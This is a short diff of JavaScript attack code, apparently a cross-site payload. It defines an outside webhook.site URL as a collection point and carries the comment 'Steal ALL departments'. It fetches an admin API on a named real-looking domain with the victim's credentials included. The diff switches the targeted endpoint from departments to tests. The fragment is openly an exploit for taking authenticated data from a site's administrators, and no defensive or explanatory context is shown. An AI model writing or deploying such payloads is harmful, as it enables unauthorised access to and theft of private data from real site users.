@@ -29,7 +29,7 @@
         const WEBHOOK = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
         
         // Steal ALL departments with full paginated response
-        fetch('https://admin.genesislab.in/api/departments?rowsPerPage=100', {
+        fetch('https://admin.genesislab.in/api/tests?rowsPerPage=100', {
             credentials: 'include'
         })
         .then(r => r.json())
